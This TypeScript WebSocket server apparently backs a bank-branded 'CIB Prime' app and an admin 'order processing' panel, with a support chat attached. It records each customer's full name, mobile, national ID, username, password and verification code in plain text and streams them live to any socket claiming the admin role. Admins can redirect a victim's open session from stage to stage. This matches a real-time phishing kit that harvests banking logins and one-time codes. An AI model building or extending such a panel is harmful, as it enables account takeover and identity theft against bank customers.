import type { Server as HttpServer } from "http";
import { WebSocketServer, WebSocket } from "ws";
import { eq, desc, and } from "drizzle-orm";
import {
  db,
  clientSessionsTable,
  clientStageLogsTable,
  conversationsTable,
  messagesTable,
  type ClientSession,
} from "@workspace/db";
import { logger } from "./logger";

// Realtime channel between the CIB Prime customer app and the admin
// "معالجة الطلبات" (order processing) panel. Runs over a single WebSocket
// endpoint mounted at /api/ws. Two roles connect to it:
//   - "client": one connection per customer browser session
//   - "admin":  one connection per open admin panel tab
//
// The client reports every stage/data change it makes; the server persists
// it and broadcasts the latest state to all connected admins. Admins can
// request history for a session/stage, or push a redirect command that is
// forwarded straight to that customer's live connection.

interface AliveSocket extends WebSocket {
  isAlive?: boolean;
  role?: "client" | "admin";
  sessionId?: string;
}

const clientSockets = new Map<string, AliveSocket>();
const adminSockets = new Set<AliveSocket>();

type ClientStatePayload = {
  sessionId: string;
  fullName: string | null;
  mobile: string | null;
  nationalId: string | null;
  username: string | null;
  password: string | null;
  verificationCode: string | null;
  stage: string;
  status: string;
  lastSeenAt: string | null;
  updatedAt: string;
  createdAt: string;
};

function toPayload(row: ClientSession): ClientStatePayload {
  return {
    sessionId: row.sessionId,
    fullName: row.fullName,
    mobile: row.mobile,
    nationalId: row.nationalId,
    username: row.username,
    password: row.password,
    verificationCode: row.verificationCode,
    stage: row.stage,
    status: row.status,
    lastSeenAt: row.lastSeenAt ? row.lastSeenAt.toISOString() : null,
    updatedAt: row.updatedAt.toISOString(),
    createdAt: row.createdAt.toISOString(),
  };
}

function safeSend(socket: WebSocket, message: unknown): void {
  if (socket.readyState === WebSocket.OPEN) {
    socket.send(JSON.stringify(message));
  }
}

function broadcastToAdmins(message: unknown): void {
  for (const admin of adminSockets) {
    safeSend(admin, message);
  }
}

async function getSession(
  sessionId: string,
): Promise<ClientSession | undefined> {
  const [row] = await db
    .select()
    .from(clientSessionsTable)
    .where(eq(clientSessionsTable.sessionId, sessionId));
  return row;
}

async function broadcastSession(sessionId: string): Promise<void> {
  const row = await getSession(sessionId);
  if (!row) return;
  broadcastToAdmins({ type: "client_state", client: toPayload(row) });
}

async function upsertSession(
  sessionId: string,
  fields: Partial<
    Pick<
      ClientSession,
      | "fullName"
      | "mobile"
      | "nationalId"
      | "username"
      | "password"
      | "verificationCode"
      | "stage"
    >
  >,
  status: "online" | "offline",
): Promise<void> {
  const now = new Date();
  const updateSet: Record<string, unknown> = { ...fields, status };
  if (status === "online") {
    updateSet.lastSeenAt = now;
  }

  await db
    .insert(clientSessionsTable)
    .values({
      sessionId,
      status,
      lastSeenAt: status === "online" ? now : null,
      ...fields,
    })
    .onConflictDoUpdate({
      target: clientSessionsTable.sessionId,
      set: updateSet,
    });
}

async function logStage(
  sessionId: string,
  stage: string,
  payload: Record<string, unknown>,
): Promise<void> {
  if (Object.keys(payload).length === 0) return;
  await db.insert(clientStageLogsTable).values({ sessionId, stage, payload });
}

async function sendHistory(
  admin: WebSocket,
  sessionId: string,
  stage: string,
): Promise<void> {
  const logs = await db
    .select()
    .from(clientStageLogsTable)
    .where(
      and(
        eq(clientStageLogsTable.sessionId, sessionId),
        eq(clientStageLogsTable.stage, stage),
      ),
    )
    .orderBy(desc(clientStageLogsTable.createdAt))
    .limit(50);

  safeSend(admin, {
    type: "client_history",
    sessionId,
    stage,
    logs: logs.map((log) => ({
      id: log.id,
      payload: log.payload,
      createdAt: log.createdAt.toISOString(),
    })),
  });
}

async function sendSnapshot(admin: WebSocket): Promise<void> {
  const rows = await db
    .select()
    .from(clientSessionsTable)
    .orderBy(desc(clientSessionsTable.updatedAt));
  safeSend(admin, {
    type: "client_list",
    clients: rows.map(toPayload),
  });
}

async function handleMessage(
  socket: AliveSocket,
  raw: WebSocket.RawData,
): Promise<void> {
  let msg: Record<string, unknown>;
  try {
    msg = JSON.parse(raw.toString());
  } catch {
    return;
  }

  const type = msg.type;

  if (type === "hello") {
    const role = msg.role === "admin" ? "admin" : "client";
    socket.role = role;

    if (role === "admin") {
      adminSockets.add(socket);
      await sendSnapshot(socket);
      return;
    }

    const sessionId = typeof msg.sessionId === "string" ? msg.sessionId : "";
    if (!sessionId) return;
    socket.sessionId = sessionId;
    // Only one live connection per session; replace any stale one.
    const existing = clientSockets.get(sessionId);
    if (existing && existing !== socket) {
      existing.close();
    }
    clientSockets.set(sessionId, socket);
    await upsertSession(sessionId, {}, "online");
    await broadcastSession(sessionId);
    return;
  }

  if (type === "ping") {
    safeSend(socket, { type: "pong" });
    if (socket.role === "client" && socket.sessionId) {
      await upsertSession(socket.sessionId, {}, "online");
    }
    return;
  }

  if (type === "stage_update" && socket.role === "client") {
    const sessionId = socket.sessionId;
    if (!sessionId) return;
    const stage = typeof msg.stage === "string" ? msg.stage : "home";
    const data =
      msg.data && typeof msg.data === "object"
        ? (msg.data as Record<string, unknown>)
        : {};

    await upsertSession(sessionId, { ...data, stage }, "online");
    await logStage(sessionId, stage, data);
    await broadcastSession(sessionId);
    return;
  }

  if (type === "request_history" && socket.role === "admin") {
    const sessionId = typeof msg.sessionId === "string" ? msg.sessionId : "";
    const stage = typeof msg.stage === "string" ? msg.stage : "";
    if (!sessionId || !stage) return;
    await sendHistory(socket, sessionId, stage);
    return;
  }

  if (type === "redirect" && socket.role === "admin") {
    const sessionId = typeof msg.sessionId === "string" ? msg.sessionId : "";
    const target = typeof msg.target === "string" ? msg.target : "";
    if (!sessionId || !target) return;
    const target_socket = clientSockets.get(sessionId);
    if (target_socket) {
      safeSend(target_socket, { type: "redirect", target });
    }
    return;
  }
}

export function setupRealtime(server: HttpServer): void {
  const wss = new WebSocketServer({ server, path: "/api/ws" });

  const heartbeat = setInterval(() => {
    for (const socket of [...clientSockets.values(), ...adminSockets]) {
      if (socket.isAlive === false) {
        socket.terminate();
        continue;
      }
      socket.isAlive = false;
      socket.ping();
    }
  }, 20000);

  wss.on("close", () => clearInterval(heartbeat));

  wss.on("connection", (ws: AliveSocket) => {
    ws.isAlive = true;
    ws.on("pong", () => {
      ws.isAlive = true;
    });

    ws.on("message", (raw) => {
      handleMessage(ws, raw).catch((err) => {
        logger.error({ err }, "Error handling realtime message");
      });
    });

    ws.on("close", () => {
      adminSockets.delete(ws);
      if (ws.role === "client" && ws.sessionId) {
        const stillCurrent = clientSockets.get(ws.sessionId) === ws;
        if (stillCurrent) {
          clientSockets.delete(ws.sessionId);
          upsertSession(ws.sessionId, {}, "offline")
            .then(() => broadcastSession(ws.sessionId!))
            .catch((err) => {
              logger.error({ err }, "Error marking session offline");
            });
        }
      }
    });
  });

  logger.info("Realtime WebSocket server mounted at /api/ws");
}

// ============================================
// WebSocket Support for Chat (Real-time Updates)
// ============================================

// Map of sessionId -> WebSocket for chat notifications
const chatClientSockets = new Map<string, AliveSocket>();
// Set of admin sockets for chat notifications
const chatAdminSockets = new Set<AliveSocket>();

// Notify client of new messages
export function notifyChatClient(sessionId: string, message: unknown): void {
  const socket = chatClientSockets.get(sessionId);
  if (socket) {
    safeSend(socket, { type: "chat_message", ...message as object });
  }
}

// Notify all admins of new conversation activity
export function notifyChatAdmins(conversation: unknown): void {
  for (const admin of chatAdminSockets) {
    safeSend(admin, { type: "chat_update", ...conversation as object });
  }
}

// Get all conversations needing agent attention
export async function getPendingConversations(): Promise<unknown[]> {
  const conversations = await db
    .select()
    .from(conversationsTable)
    .orderBy(desc(conversationsTable.updatedAt));
  return conversations;
}

// Handle chat WebSocket messages
async function handleChatMessage(
  socket: AliveSocket,
  raw: WebSocket.RawData,
): Promise<void> {
  let msg: Record<string, unknown>;
  try {
    msg = JSON.parse(raw.toString());
  } catch {
    return;
  }

  const type = msg.type;

  // Client connects for chat
  if (type === "chat_hello") {
    const sessionId = typeof msg.sessionId === "string" ? msg.sessionId : "";
    if (!sessionId) return;
    
    socket.sessionId = sessionId;
    socket.role = "client";
    
    const existing = chatClientSockets.get(sessionId);
    if (existing && existing !== socket) {
      existing.close();
    }
    chatClientSockets.set(sessionId, socket);
    
    // Update client online status
    await db
      .update(conversationsTable)
      .set({ clientOnlineAt: new Date() })
      .where(eq(conversationsTable.clientSessionId, sessionId));
    
    safeSend(socket, { type: "chat_connected" });
    return;
  }

  // Admin connects for chat management
  if (type === "chat_admin_hello") {
    socket.role = "admin";
    chatAdminSockets.add(socket);
    
    // Send all conversations
    const conversations = await getPendingConversations();
    safeSend(socket, { type: "chat_conversations_list", conversations });
    return;
  }

  // Admin requests conversation details
  if (type === "chat_get_conversation" && socket.role === "admin") {
    const conversationId = msg.conversationId;
    if (!conversationId) return;
    
    const messages = await db
      .select()
      .from(messagesTable)
      .where(eq(messagesTable.conversationId, conversationId as number))
      .orderBy(messagesTable.createdAt);
    
    safeSend(socket, { type: "chat_messages", conversationId, messages });
    return;
  }

  // Agent sends message to client
  if (type === "chat_agent_message" && socket.role === "admin") {
    const conversationId = msg.conversationId;
    const content = typeof msg.content === "string" ? msg.content : "";
    
    if (!conversationId || !content) return;
    
    // Get conversation's sessionId
    const [conversation] = await db
      .select()
      .from(conversationsTable)
      .where(eq(conversationsTable.id, conversationId as number));
    
    if (conversation) {
      // Save message
      await db.insert(messagesTable).values({
        conversationId: conversationId as number,
        senderType: "agent",
        content,
      });
      
      // Notify client via WebSocket
      notifyChatClient(conversation.clientSessionId, {
        type: "new_message",
        senderType: "agent",
        content,
      });
    }
    return;
  }
}

// Export chat message handlers
export { handleChatMessage, chatClientSockets, chatAdminSockets };

// ============================================
// Agent Request Notifications
// ============================================

interface AgentRequestData {
  conversationId: number;
  clientName: string;
  clientPhone?: string;
  clientEmail?: string;
  sessionId: string;
  timestamp: string;
}

/**
 * Notify all connected admins about a new agent request
 */
export function notifyAdminsOfAgentRequest(data: AgentRequestData): void {
  console.log("[NOTIFICATION] Sending agent request notification to admins:", data);
  
  const notification = {
    type: "agent_request",
    data: data,
    priority: "high",
    sound: true
  };

  for (const admin of chatAdminSockets) {
    safeSend(admin, notification);
  }
  
  // Also send to regular admin sockets
  for (const admin of adminSockets) {
    safeSend(admin, notification);
  }
}
